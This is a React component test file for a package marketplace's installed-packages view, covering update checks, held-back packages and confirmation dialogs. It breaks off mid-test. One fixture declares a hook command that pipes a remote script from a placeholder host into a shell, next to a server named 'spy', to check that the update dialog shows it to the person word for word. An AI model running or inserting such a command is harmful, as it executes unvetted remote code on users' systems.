/**
 * @vitest-environment jsdom
 */
import { describe, it, expect, vi, beforeEach, afterEach, beforeAll } from 'vitest';
import { render, screen, cleanup, act, fireEvent, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import type {
  InstallationUpdateCheck,
  InstallIntegrity,
  InstalledPackage,
  InstalledShapeSummary,
} from '@dorkos/shared/marketplace-schemas';
import {
  useApplyingInstallPaths,
  useInstalledIntegrity,
  useInstalledPackages,
} from '@/layers/entities/marketplace';
import { useShapes } from '@/layers/entities/shapes';
import { useAppStore } from '@/layers/shared/model';

import { useUninstallWithToast } from '../model/use-uninstall-with-toast';
import { useApplyUpdatesWithToast } from '../model/use-apply-updates-with-toast';
import { usePrepareWithToast } from '../model/use-prepare-with-toast';
import {
  useInstalledUpdatesView,
  type InstalledUpdatesView,
} from '../model/use-installed-updates-view';
import { indexChecks, summarizeUpdates } from '../lib/installed-updates';
import { InstalledPackagesView } from '../ui/InstalledPackagesView';

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------
// The view drives uninstall/update through the feature-layer toast wrappers
// (which fire sonner notifications) and reads the update check through the
// feature's view hook, so mock those rather than the raw entity hooks.

const reviewMutate = vi.fn();
vi.mock('@/layers/entities/marketplace', () => ({
  useInstalledPackages: vi.fn(),
  useApplyingInstallPaths: vi.fn(),
  useReviewHeldBackPackage: () => ({
    mutate: reviewMutate,
    isPending: false,
    variables: undefined,
  }),
  useInstalledIntegrity: vi.fn(),
}));

vi.mock('../model/use-prepare-with-toast', () => ({
  usePrepareWithToast: vi.fn(),
}));

vi.mock('@/layers/entities/shapes', () => ({
  useShapes: vi.fn(),
}));

vi.mock('../model/use-uninstall-with-toast', () => ({
  useUninstallWithToast: vi.fn(),
}));

vi.mock('../model/use-apply-updates-with-toast', () => ({
  useApplyUpdatesWithToast: vi.fn(),
}));

vi.mock('../model/use-installed-updates-view', () => ({
  useInstalledUpdatesView: vi.fn(),
}));

const uninstallMutate = vi.fn();
const prepareMutate = vi.fn();

/** Set what verification says about each installation, by installPath (DOR-2197). */
function setIntegrity(byPath: Record<string, InstallIntegrity> = {}) {
  vi.mocked(useInstalledIntegrity).mockReturnValue({
    data: new Map(Object.entries(byPath)),
  } as unknown as ReturnType<typeof useInstalledIntegrity>);
}

function setPrepareState(state: { isPending?: boolean; variables?: { name: string } } = {}) {
  vi.mocked(usePrepareWithToast).mockReturnValue({
    mutate: prepareMutate,
    isPending: state.isPending ?? false,
    variables: state.variables,
  } as unknown as ReturnType<typeof usePrepareWithToast>);
}
const applyUpdates = vi.fn();
const recheck = vi.fn();

interface MutationMockState {
  isPending?: boolean;
  variables?: { name: string };
}

function setInstalledState(state: {
  data?: InstalledPackage[];
  isLoading?: boolean;
  error?: Error | null;
}) {
  vi.mocked(useInstalledPackages).mockReturnValue({
    data: state.data,
    isLoading: state.isLoading ?? false,
    error: state.error ?? null,
    refetch: vi.fn(),
  } as unknown as ReturnType<typeof useInstalledPackages>);
}

function setShapesState(data: InstalledShapeSummary[] = []) {
  vi.mocked(useShapes).mockReturnValue({
    data,
    isLoading: false,
    isError: false,
  } as unknown as ReturnType<typeof useShapes>);
}

function setUninstallState(state: MutationMockState = {}) {
  vi.mocked(useUninstallWithToast).mockReturnValue({
    mutate: uninstallMutate,
    mutateAsync: vi.fn(),
    isPending: state.isPending ?? false,
    isSuccess: false,
    isError: false,
    error: null,
    variables: state.variables,
    reset: vi.fn(),
  } as unknown as ReturnType<typeof useUninstallWithToast>);
}

/**
 * Set the update check the view reads. The summary is computed with the real
 * join from the rows given, exactly as the hook computes it.
 */
function setUpdatesState(
  state: {
    rows?: InstalledPackage[];
    checks?: InstallationUpdateCheck[];
    isChecking?: boolean;
    error?: Error | null;
    applying?: string[];
  } = {}
) {
  const checks = indexChecks(state.checks);
  vi.mocked(useInstalledUpdatesView).mockReturnValue({
    checks,
    summary: summarizeUpdates(state.rows ?? [], checks),
    isChecking: state.isChecking ?? false,
    error: state.error ?? null,
    recheck,
  } satisfies InstalledUpdatesView);
  vi.mocked(useApplyingInstallPaths).mockReturnValue(new Set(state.applying ?? []));
}

// ---------------------------------------------------------------------------
// Polyfills (pointer capture for Radix ripples, matchMedia for responsive)
// ---------------------------------------------------------------------------

beforeAll(() => {
  Object.defineProperty(window, 'matchMedia', {
    writable: true,
    value: vi.fn().mockImplementation((query: string) => ({
      matches: false,
      media: query,
      onchange: null,
      addListener: vi.fn(),
      removeListener: vi.fn(),
      addEventListener: vi.fn(),
      removeEventListener: vi.fn(),
      dispatchEvent: vi.fn(),
    })),
  });
});

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

function makeInstalled(overrides: Partial<InstalledPackage> = {}): InstalledPackage {
  return {
    name: '@dorkos/reviewer',
    version: '1.2.0',
    type: 'agent',
    installPath: '/tmp/.dork/agents/reviewer',
    installedFrom: 'github.com/dorkos/reviewer',
    installedAt: '2026-03-15T12:00:00.000Z',
    ...overrides,
  };
}

/** A check for a row, current by default. */
function makeCheck(
  pkg: InstalledPackage,
  overrides: Partial<InstallationUpdateCheck> = {}
): InstallationUpdateCheck {
  return {
    packageName: pkg.name,
    installedVersion: pkg.version,
    latestVersion: pkg.version,
    hasUpdate: false,
    marketplace: 'dorkos-community',
    status: 'current',
    installPath: pkg.installPath,
    type: pkg.type,
    scope: pkg.scope ?? 'global',
    agentPath: pkg.agentPath,
    agentName: pkg.agentName,
    ...overrides,
  };
}

/** A check that found a newer version for a row. */
function staleCheck(pkg: InstalledPackage, latestVersion: string): InstallationUpdateCheck {
  return makeCheck(pkg, { latestVersion, hasUpdate: true, status: 'update-available' });
}

/** Show these rows with these checks. */
function showRows(rows: InstalledPackage[], checks: InstallationUpdateCheck[] = [], extra = {}) {
  setInstalledState({ data: rows });
  setUpdatesState({ rows, checks, ...extra });
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('InstalledPackagesView', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    setUninstallState();
    setUpdatesState();
    vi.mocked(useApplyUpdatesWithToast).mockReturnValue({ apply: applyUpdates });
    setShapesState();
    setIntegrity();
    setPrepareState();
    useAppStore.setState({ shapeSwitcherOpen: false, shapeSwitcherFocus: null });
  });

  afterEach(cleanup);

  describe('state rendering', () => {
    it('renders the loading skeleton while the query is pending', () => {
      setInstalledState({ isLoading: true });

      render(<InstalledPackagesView />);

      // No list + no empty state — the skeleton is distinctly not a list.
      expect(screen.queryByRole('list')).not.toBeInTheDocument();
      expect(screen.queryByText(/no packages installed/i)).not.toBeInTheDocument();
    });

    it('renders the error state when the query errors', () => {
      setInstalledState({ error: new Error('Disk full') });

      render(<InstalledPackagesView />);

      expect(screen.getByText(/disk full/i)).toBeInTheDocument();
      expect(screen.getByRole('button', { name: /try again/i })).toBeInTheDocument();
    });

    it('keeps a dependency warning visible on the package it belongs to (DOR-1341)', () => {
      // The install toast said this once and is long gone. A package that is on
      // disk but missing its libraries has to be able to say so on the surface
      // a person visits when something is not working.
      setInstalledState({
        data: [
          makeInstalled({
            dependencyWarnings: [
              "DorkOS could not install this package's npm libraries because npm is not installed. Run `npm install --omit=dev` in /tmp/p to finish setting it up.",
            ],
          }),
        ],
      });

      render(<InstalledPackagesView />);

      expect(
        screen.getByText(/could not install this package's npm libraries/i)
      ).toBeInTheDocument();
      // The remedy travels with it — a warning you cannot act on is noise.
      expect(screen.getByText(/npm install --omit=dev/)).toBeInTheDocument();
    });

    it('shows no warning line for a package that installed cleanly', () => {
      setInstalledState({ data: [makeInstalled()] });

      render(<InstalledPackagesView />);

      expect(screen.queryByText(/npm libraries/i)).not.toBeInTheDocument();
    });

    it('renders the empty state when no packages are installed', () => {
      setInstalledState({ data: [] });

      render(<InstalledPackagesView />);

      expect(screen.getByText(/no packages installed/i)).toBeInTheDocument();
      expect(screen.getByText(/browse the marketplace/i)).toBeInTheDocument();
    });

    it('renders a row per installed package', () => {
      setInstalledState({
        data: [
          makeInstalled({ name: '@dorkos/reviewer', version: '1.2.0' }),
          makeInstalled({ name: '@dorkos/formatter', type: 'plugin', version: '2.0.1' }),
        ],
      });

      render(<InstalledPackagesView />);

      const list = screen.getByRole('list', { name: /installed packages/i });
      expect(list).toBeInTheDocument();
      expect(screen.getByText('Reviewer')).toBeInTheDocument();
      expect(screen.getByText('Formatter')).toBeInTheDocument();
      expect(screen.getByText('v1.2.0')).toBeInTheDocument();
      expect(screen.getByText('v2.0.1')).toBeInTheDocument();
    });

    it('renders an installed Shape with its SHAPE type badge (DOR-355 regression)', () => {
      // Shapes install to <dorkHome>/shapes/<name> and were invisible here until
      // the scanner learned to walk that root; once listed, the row must render
      // with the SHAPE badge like any other type.
      setInstalledState({
        data: [
          makeInstalled({
            name: 'linear-ops',
            type: 'shape',
            version: '2.0.0',
            scope: 'global',
            installPath: '/tmp/.dork/shapes/linear-ops',
          }),
        ],
      });

      render(<InstalledPackagesView />);

      expect(screen.getByText('Linear Ops')).toBeInTheDocument();
      expect(screen.getByText('SHAPE')).toBeInTheDocument();
      expect(screen.getByText('v2.0.0')).toBeInTheDocument();
    });

    it('shows the same cyan CONNECTOR badge Browse shows, for an installed connector adapter (DOR-710)', () => {
      // Browse already renders CONNECTOR for adapterType: 'connector'; the
      // installed view used to render the generic ADAPTER badge instead
      // because the installed-package DTO carried no adapterType.
      setInstalledState({
        data: [
          makeInstalled({
            name: 'slack-connector',
            type: 'adapter',
            adapterType: 'connector',
            version: '1.0.0',
            installPath: '/tmp/.dork/plugins/slack-connector',
          }),
        ],
      });

      render(<InstalledPackagesView />);

      expect(screen.getByText('CONNECTOR')).toBeInTheDocument();
      expect(screen.queryByText('ADAPTER')).not.toBeInTheDocument();
    });
  });

  describe('shape rows: apply + active', () => {
    const SHAPE_ROW: Partial<InstalledPackage> = {
      name: 'linear-ops',
      type: 'shape',
      version: '2.0.0',
      scope: 'global',
      installPath: '/tmp/.dork/shapes/linear-ops',
    };

    it('offers Apply on a shape row and opens the switcher landed on THAT shape', async () => {
      const user = userEvent.setup();
      setInstalledState({ data: [makeInstalled(SHAPE_ROW)] });

      render(<InstalledPackagesView />);

      const applyBtn = screen.getByRole('button', { name: /apply Linear Ops/i });
      expect(useAppStore.getState().shapeSwitcherOpen).toBe(false);
      await user.click(applyBtn);
      expect(useAppStore.getState().shapeSwitcherOpen).toBe(true);
      // The affordance is honest AND direct — it passes the row's raw name so the
      // switcher highlights the exact Shape, not a generic list.
      expect(useAppStore.getState().shapeSwitcherFocus).toBe('linear-ops');
    });

    it('marks the applied shape with an Active badge and hides its Apply action', () => {
      setInstalledState({
        data: [
          makeInstalled(SHAPE_ROW),
          makeInstalled({
            ...SHAPE_ROW,
            name: 'flow-board',
            installPath: '/tmp/.dork/shapes/flow-board',
          }),
        ],
      });
      setShapesState([
        { name: 'linear-ops', displayName: 'Linear Ops', active: true },
        { name: 'flow-board', displayName: 'Flow Board', active: false },
      ]);

      render(<InstalledPackagesView />);

      // The active shape's row carries the badge and NO Apply — the badge is the
      // state, and re-apply lives in the switcher (no redundant button).
      const activeRow = screen.getByText('Linear Ops').closest<HTMLElement>('[role="listitem"]')!;
      expect(within(activeRow).getByText('Active')).toBeInTheDocument();
      expect(
        within(activeRow).queryByRole('button', { name: /apply Linear Ops/i })
      ).not.toBeInTheDocument();
      // The non-active shape offers Apply and shows no badge.
      const otherRow = screen.getByText('Flow Board').closest<HTMLElement>('[role="listitem"]')!;
      expect(within(otherRow).queryByText('Active')).not.toBeInTheDocument();
      expect(
        within(otherRow).getByRole('button', { name: /apply Flow Board/i })
      ).toBeInTheDocument();
    });

    it('leaves non-shape rows unchanged — no Apply, no Active badge', () => {
      setInstalledState({ data: [makeInstalled({ name: '@dorkos/reviewer', type: 'agent' })] });
      // Even if a shape is active elsewhere, an agent row never shows Active/Apply.
      setShapesState([{ name: '@dorkos/reviewer', active: true }]);

      render(<InstalledPackagesView />);

      expect(screen.queryByRole('button', { name: /^apply/i })).not.toBeInTheDocument();
      expect(screen.queryByText('Active')).not.toBeInTheDocument();
    });
  });

  describe('update states', () => {
    const REVIEWER = makeInstalled({ name: '@dorkos/reviewer', version: '1.2.0' });
    const FORMATTER = makeInstalled({
      name: '@dorkos/formatter',
      type: 'plugin',
      version: '2.0.1',
      installPath: '/tmp/.dork/plugins/formatter',
    });
    const REVIEWER_ON_ALPHA = makeInstalled({
      name: '@dorkos/reviewer',
      version: '1.1.0',
      scope: 'agent-local',
      agentPath: '/work/alpha',
      agentName: 'Alpha',
      installPath: '/work/alpha/.dork/agents/reviewer',
    });

    function row(name: string, index = 0): HTMLElement {
      return screen.getAllByText(name)[index]!.closest<HTMLElement>('[role="listitem"]')!;
    }

    it('shows a stale row as stale, with both versions, before anything is clicked', () => {
      // Purpose: the issue's first acceptance line. The person can see what is
      // out of date, and by how much, without pressing a button to find out.
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')]);

      render(<InstalledPackagesView />);

      const reviewer = row('Reviewer');
      expect(within(reviewer).getByText(/update available: v1\.2\.0/i)).toHaveTextContent(
        /v1\.2\.0\s*→\s*to\s*v1\.3\.0/
      );
      expect(
        within(reviewer).getByRole('button', { name: 'Update Reviewer from v1.2.0 to v1.3.0' })
      ).toHaveTextContent('Update to v1.3.0');
    });

    it('offers no Update on a current row, and says it is up to date', () => {
      // Purpose: pressing Update on a current package must be impossible.
      showRows([REVIEWER], [makeCheck(REVIEWER)]);

      render(<InstalledPackagesView />);

      const reviewer = row('Reviewer');
      expect(within(reviewer).getByText('Up to date')).toBeInTheDocument();
      expect(within(reviewer).queryByRole('button', { name: /update/i })).not.toBeInTheDocument();
    });

    it('says why a row could not be checked, and offers no Update there', () => {
      // Purpose: DorkOS never calls a package current when it couldn’t check it,
      // and a blind Update is exactly what this row must not get.
      showRows(
        [REVIEWER],
        [
          makeCheck(REVIEWER, {
            status: 'unknown',
            latestVersion: '',
            note: 'linked install — update its source instead',
          }),
        ]
      );

      render(<InstalledPackagesView />);

      const reviewer = row('Reviewer');
      expect(
        within(reviewer).getByText(
          'Couldn’t check for updates: linked install — update its source instead'
        )
      ).toBeInTheDocument();
      expect(within(reviewer).queryByText('Up to date')).not.toBeInTheDocument();
      expect(within(reviewer).queryByRole('button', { name: /update/i })).not.toBeInTheDocument();
    });

    it('shows a check in flight as pending on every row, never as failed', () => {
      // Purpose: a check can wait behind another scan (the server's shared cap
      // of 4); it reads as "checking", and nothing offers an Update meanwhile.
      showRows([REVIEWER, FORMATTER], [staleCheck(REVIEWER, '1.3.0')], { isChecking: true });

      render(<InstalledPackagesView />);

      expect(screen.getAllByText('Checking for updates…')).toHaveLength(2);
      expect(screen.getByRole('status')).toHaveTextContent('Checking your packages for updates…');
      expect(screen.queryByText(/couldn’t/i)).not.toBeInTheDocument();
      expect(screen.queryByRole('button', { name: /^update/i })).not.toBeInTheDocument();
    });

    it('updates exactly the row that was clicked', async () => {
      // Purpose: a row's Update reinstalls that installation (by its path), not
      // every installation that shares its name.
      const user = userEvent.setup();
      const aliceCheck = staleCheck(REVIEWER_ON_ALPHA, '1.3.0');
      showRows([REVIEWER, REVIEWER_ON_ALPHA], [staleCheck(REVIEWER, '1.3.0'), aliceCheck]);

      render(<InstalledPackagesView />);
      await user.click(
        screen.getByRole('button', { name: 'Update Reviewer on Alpha from v1.1.0 to v1.3.0' })
      );

      expect(applyUpdates).toHaveBeenCalledTimes(1);
      expect(applyUpdates).toHaveBeenCalledWith([
        { installation: REVIEWER_ON_ALPHA, check: aliceCheck },
      ]);
    });

    it('confirms first, listing what it runs, when the new version runs something (DOR-2306)', async () => {
      // Purpose: a row's Update used to reinstall at once with nothing shown.
      // A new version that runs anything on its own now opens the confirm,
      // and nothing is reinstalled until the person confirms.
      const user = userEvent.setup();
      const hooked = {
        ...staleCheck(REVIEWER, '1.3.0'),
        disclosed: {
          hooks: [
            {
              event: 'PreToolUse',
              matcher: null,
              command: 'curl -s https://x.example | sh',
              source: null,
            },
          ],
          schedules: [],
          mcpServers: [
            { name: 'spy', transport: 'stdio', command: 'node', args: ['spy.js'], url: null },
          ],
          lspServers: [],
          monitors: [],
          executables: [],
          skillTools: [],
        },
      };
      showRows([REVIEWER], [hooked]);

      render(<InstalledPackagesView />);
      await user.click(
        screen.getByRole('button', { name: 'Update Reviewer from v1.2.0 to v1.3.0' })
      );

      expect(applyUpdates).not.toHaveBeenCalled();
      const dialog = await screen.findByRole('dialog', { name: 'Update Reviewer?' });
      const runs = within(dialog).getByRole('list', { name: 'What the new version runs' });
      // Verbatim, never paraphrased: the command is what a person judges.
      expect(runs).toHaveTextContent('curl -s https://x.example | sh');
      expect(runs).toHaveTextContent('"node" "spy.js"');
      // A global install's own programs start in every session, and it says so.
      expect(runs).toHaveTextContent('Starts in every session.');

      await user.click(within(dialog).getByRole('button', { name: 'Update Reviewer' }));
      expect(applyUpdates).toHaveBeenCalledWith([{ installation: REVIEWER, check: hooked }]);
    });

    it('keeps an installation that is updating in place, disabled', () => {
      // Purpose: each in-flight update keeps its own progress, however many run.
      showRows(
        [REVIEWER, FORMATTER],
        [staleCheck(REVIEWER, '1.3.0'), staleCheck(FORMATTER, '2.1.0')],
        {
          applying: [REVIEWER.installPath, FORMATTER.installPath],
        }
      );

      render(<InstalledPackagesView />);

      for (const name of ['Reviewer', 'Formatter']) {
        const button = within(row(name)).getByRole('button', { name: `Updating ${name}` });
        // aria-disabled, not disabled: a disabled button drops keyboard focus.
        expect(button).toHaveAttribute('aria-disabled', 'true');
      }
      expect(within(row('Reviewer')).getByText('Updating to v1.3.0…')).toBeInTheDocument();
    });

    it('does nothing when an installation being updated is pressed again', async () => {
      // Purpose: the button stays focusable while updating, so pressing it
      // must not start a second update.
      const user = userEvent.setup();
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')], { applying: [REVIEWER.installPath] });

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Updating Reviewer' }));

      expect(applyUpdates).not.toHaveBeenCalled();
    });

    it('moves focus to the row’s status line when its Update button leaves', async () => {
      // Purpose: once the package is current its Update button is gone; a
      // keyboard user who pressed it must land on "Up to date", not the page.
      const user = userEvent.setup();
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')]);
      const { rerender } = render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: /^update reviewer/i }));
      expect(screen.getByRole('button', { name: /^update reviewer/i })).toHaveFocus();

      showRows([REVIEWER], [makeCheck(REVIEWER)]);
      rerender(<InstalledPackagesView />);

      const status = within(row('Reviewer')).getByTestId('installation-update-status');
      expect(status).toHaveFocus();
      expect(status).toHaveTextContent('Up to date');
    });

    it('leaves focus alone when the person has moved on', async () => {
      const user = userEvent.setup();
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')]);
      const { rerender } = render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: /^update reviewer/i }));
      await user.tab();
      const moved = document.activeElement;

      showRows([REVIEWER], [makeCheck(REVIEWER)]);
      rerender(<InstalledPackagesView />);

      expect(document.activeElement).toBe(moved);
    });

    it('never takes focus from an element that holds it', () => {
      // Purpose: a blur can arrive without saying where focus went (a window
      // switch, an iframe); if focus is somewhere real when the button leaves,
      // it stays there.
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')]);
      const { rerender } = render(<InstalledPackagesView />);
      const checkAgain = screen.getByRole('button', { name: 'Check again' });
      checkAgain.focus();
      // The Update button saw a focus whose blur never said where it went.
      fireEvent.focus(screen.getByRole('button', { name: /^update reviewer/i }));

      showRows([REVIEWER], [makeCheck(REVIEWER)]);
      rerender(<InstalledPackagesView />);

      expect(checkAgain).toHaveFocus();
    });

    it('offers no summary actions while a check is running', () => {
      // Purpose: nothing to act on until the answer lands.
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')], { isChecking: true });

      render(<InstalledPackagesView />);

      expect(screen.queryByRole('button', { name: /check again/i })).not.toBeInTheDocument();
      expect(screen.queryByRole('button', { name: /update all/i })).not.toBeInTheDocument();
    });

    it('holds "Check again" while an update is being applied', () => {
      // Purpose: a check during a reinstall could read a half-installed folder.
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')], { applying: [REVIEWER.installPath] });

      render(<InstalledPackagesView />);

      expect(screen.getByRole('button', { name: 'Check again' })).toBeDisabled();
    });

    it('offers no "Update all" beside a failed check, whatever an older answer said', () => {
      // Purpose: with the check failed, no answer is current enough to act on.
      showRows([REVIEWER], [staleCheck(REVIEWER, '1.3.0')], { error: new Error('offline') });

      render(<InstalledPackagesView />);

      expect(screen.queryByRole('button', { name: /update all/i })).not.toBeInTheDocument();
    });

    it('keeps a failed update on its row, with the reason, and still offers it', () => {
      // Purpose: a failure stays visible where it happened, and can be retried.
      showRows([REVIEWER], [{ ...staleCheck(REVIEWER, '1.3.0'), applyError: 'disk full' }]);

      render(<InstalledPackagesView />);

      const reviewer = row('Reviewer');
      expect(within(reviewer).getByText('Couldn’t update: disk full')).toBeInTheDocument();
      expect(within(reviewer).getByRole('button', { name: /^update reviewer/i })).toBeEnabled();
    });

    it('says plainly when everything is up to date, with no Update anywhere', () => {
      showRows([REVIEWER, FORMATTER], [makeCheck(REVIEWER), makeCheck(FORMATTER)]);

      render(<InstalledPackagesView />);

      expect(screen.getByRole('status')).toHaveTextContent('All packages are up to date.');
      expect(screen.queryByRole('button', { name: /update/i })).not.toBeInTheDocument();
      expect(screen.getByRole('button', { name: 'Check again' })).toBeInTheDocument();
    });

    it('counts what needs updating, what is current, and what could not be checked', () => {
      showRows(
        [REVIEWER, FORMATTER, REVIEWER_ON_ALPHA],
        [
          staleCheck(REVIEWER, '1.3.0'),
          makeCheck(FORMATTER),
          makeCheck(REVIEWER_ON_ALPHA, { status: 'unknown', latestVersion: '' }),
        ]
      );

      render(<InstalledPackagesView />);

      expect(screen.getByRole('status')).toHaveTextContent(
        '1 update available.1 package is up to date.1 package couldn’t be checked.'
      );
    });

    it('shows a failed check with its reason and a way to try again', async () => {
      // Purpose: when the whole check fails there are no answers, so no row may
      // claim one, and the person can ask again.
      const user = userEvent.setup();
      showRows([REVIEWER], [], { error: new Error('Failed to fetch') });

      render(<InstalledPackagesView />);

      expect(screen.getByRole('status')).toHaveTextContent(
        'Couldn’t check for updates: Failed to fetch'
      );
      expect(within(row('Reviewer')).queryByText('Up to date')).not.toBeInTheDocument();
      await user.click(screen.getByRole('button', { name: 'Try again' }));
      expect(recheck).toHaveBeenCalledTimes(1);
    });

    it('checks again on request', async () => {
      const user = userEvent.setup();
      showRows([REVIEWER], [makeCheck(REVIEWER)]);

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Check again' }));

      expect(recheck).toHaveBeenCalledTimes(1);
    });
  });

  describe('held-back global packages (DOR-2306, I2)', () => {
    /** The row that lists `name`. */
    function row(name: string): HTMLElement {
      return screen.getAllByText(name)[0]!.closest<HTMLElement>('[role="listitem"]')!;
    }

    it('says a held-back package is held back and why, and asks again on Review', async () => {
      // Purpose: a package left out of every session must never just vanish.
      const user = userEvent.setup();
      const held = makeInstalled({
        name: 'fmt',
        type: 'plugin',
        heldBack: {
          reason: 'unasked',
          reviewable: true,
          note: 'Held back: its files changed since you approved it. Review it to decide.',
        },
      });
      showRows([held]);

      render(<InstalledPackagesView />);

      const fmt = row('Fmt');
      expect(within(fmt).getByText('Held back')).toBeInTheDocument();
      expect(within(fmt).getByText(/its files changed since you approved it/)).toBeInTheDocument();
      await user.click(within(fmt).getByRole('button', { name: 'Review Fmt' }));
      expect(reviewMutate).toHaveBeenCalledWith('fmt', expect.anything());
    });

    it('offers no Review for one that cannot be put on a card, and says what to do', () => {
      const held = makeInstalled({
        name: 'broken',
        type: 'plugin',
        heldBack: {
          reason: 'unreadable',
          reviewable: false,
          note: 'Held back: DorkOS could not read part of it (hooks/hooks.json). Reinstall it, or uninstall it.',
        },
      });
      showRows([held]);

      render(<InstalledPackagesView />);

      expect(
        within(row('Broken')).queryByRole('button', { name: /review/i })
      ).not.toBeInTheDocument();
      expect(within(row('Broken')).getByText(/Reinstall it, or uninstall it/)).toBeInTheDocument();
    });
  });

  describe('update all', () => {
    const REVIEWER = makeInstalled({ name: '@dorkos/reviewer', version: '1.2.0' });
    const FORMATTER = makeInstalled({
      name: '@dorkos/formatter',
      type: 'plugin',
      version: '2.0.1',
      installPath: '/tmp/.dork/plugins/formatter',
    });
    const FLOW_ON_ALPHA = makeInstalled({
      name: 'flow',
      type: 'plugin',
      version: '0.7.2',
      scope: 'agent-local',
      agentPath: '/work/alpha',
      agentName: 'Alpha',
      installPath: '/work/alpha/.dork/plugins/flow',
    });
    const CHECKS = [
      staleCheck(REVIEWER, '1.3.0'),
      makeCheck(FORMATTER),
      staleCheck(FLOW_ON_ALPHA, '0.7.3'),
    ];

    it('names exactly the installations it will touch, by place and version', async () => {
      // Purpose: the confirm step lists every stale installation (and only
      // those), each with where it lives and what it changes to.
      const user = userEvent.setup();
      showRows([REVIEWER, FORMATTER, FLOW_ON_ALPHA], CHECKS);

      render(<InstalledPackagesView />);
      expect(screen.getByRole('status')).toHaveTextContent('2 updates available.');
      await user.click(screen.getByRole('button', { name: 'Update all…' }));

      const dialog = await screen.findByRole('dialog', { name: 'Update 2 packages?' });
      const items = within(
        within(dialog).getByRole('list', { name: 'Packages to update' })
      ).getAllByRole('listitem');
      expect(items).toHaveLength(2);
      expect(items[0]).toHaveTextContent('Reviewer');
      expect(items[0]).toHaveTextContent('All agents');
      expect(items[0]).toHaveTextContent(/v1\.2\.0\s*→\s*to\s*v1\.3\.0/);
      expect(items[1]).toHaveTextContent('Flow');
      expect(items[1]).toHaveTextContent('Alpha');
      expect(items[1]).toHaveTextContent('/work/alpha');
      expect(items[1]).toHaveTextContent(/v0\.7\.2\s*→\s*to\s*v0\.7\.3/);
      expect(within(dialog).queryByText('Formatter')).not.toBeInTheDocument();
    });

    it('applies exactly what it showed when confirmed', async () => {
      const user = userEvent.setup();
      showRows([REVIEWER, FORMATTER, FLOW_ON_ALPHA], CHECKS);

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Update all…' }));
      const dialog = await screen.findByRole('dialog');
      await user.click(within(dialog).getByRole('button', { name: 'Update 2 packages' }));

      expect(applyUpdates).toHaveBeenCalledTimes(1);
      expect(applyUpdates).toHaveBeenCalledWith([
        { installation: REVIEWER, check: CHECKS[0] },
        { installation: FLOW_ON_ALPHA, check: CHECKS[2] },
      ]);
      expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
    });

    it('updates nothing when cancelled', async () => {
      const user = userEvent.setup();
      showRows([REVIEWER, FORMATTER, FLOW_ON_ALPHA], CHECKS);

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Update all…' }));
      const dialog = await screen.findByRole('dialog');
      await user.click(within(dialog).getByRole('button', { name: 'Cancel' }));

      expect(applyUpdates).not.toHaveBeenCalled();
      expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
    });

    it('stays in place, unavailable, while its updates run', async () => {
      // Purpose: the dialog returns focus to "Update all…" when it closes, so
      // the button must still be there; pressing it meanwhile opens nothing.
      const user = userEvent.setup();
      showRows([REVIEWER, FORMATTER, FLOW_ON_ALPHA], CHECKS, {
        applying: [REVIEWER.installPath, FLOW_ON_ALPHA.installPath],
      });

      render(<InstalledPackagesView />);
      const button = screen.getByRole('button', { name: 'Update all…' });
      expect(button).toHaveAttribute('aria-disabled', 'true');
      await user.click(button);

      expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
    });

    it('moves focus to the summary when nothing is left to update', async () => {
      // Purpose: after the batch lands "Update all…" leaves; focus goes to the
      // line that now says everything is up to date.
      const user = userEvent.setup();
      showRows([REVIEWER, FORMATTER], [staleCheck(REVIEWER, '1.3.0'), makeCheck(FORMATTER)]);
      const { rerender } = render(<InstalledPackagesView />);
      screen.getByRole('button', { name: 'Update all…' }).focus();
      await user.keyboard('{Escape}');
      expect(screen.getByRole('button', { name: 'Update all…' })).toHaveFocus();

      showRows([REVIEWER, FORMATTER], [makeCheck(REVIEWER), makeCheck(FORMATTER)]);
      rerender(<InstalledPackagesView />);

      expect(screen.getByRole('status')).toHaveFocus();
      expect(screen.getByRole('status')).toHaveTextContent('All packages are up to date.');
    });

    it('says when a new version runs nothing, and that a project copy does not start programs', async () => {
      // Purpose: "runs nothing" must be said, never left as a blank a person
      // cannot tell from "not checked"; and a project install's servers do not
      // start, which the row must not overstate.
      const user = userEvent.setup();
      const quiet = staleCheck(REVIEWER, '1.3.0');
      const withServer = {
        ...staleCheck(FLOW_ON_ALPHA, '0.7.3'),
        disclosed: {
          hooks: [],
          schedules: [],
          mcpServers: [{ name: 'db', transport: 'stdio', command: 'db-mcp', args: [], url: null }],
          lspServers: [],
          monitors: [],
          executables: [],
          skillTools: [],
        },
      };
      showRows([REVIEWER, FLOW_ON_ALPHA], [quiet, withServer]);

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Update all…' }));

      const dialog = await screen.findByRole('dialog');
      const items = within(
        within(dialog).getByRole('list', { name: 'Packages to update' })
      ).getAllByRole('listitem', { name: undefined });
      expect(items[0]).toHaveTextContent('The new version runs nothing on its own.');
      expect(
        within(dialog).getByRole('list', { name: 'What the new version runs' })
      ).toHaveTextContent('Declared, but not started for a project install.');
    });

    it('confirms a single installation by name and place', async () => {
      // Purpose: the confirm step is general (DOR-2306 routes one row through
      // it); with one installation it names it instead of counting.
      const user = userEvent.setup();
      showRows([FLOW_ON_ALPHA], [staleCheck(FLOW_ON_ALPHA, '0.7.3')]);

      render(<InstalledPackagesView />);
      await user.click(screen.getByRole('button', { name: 'Update all…' }));

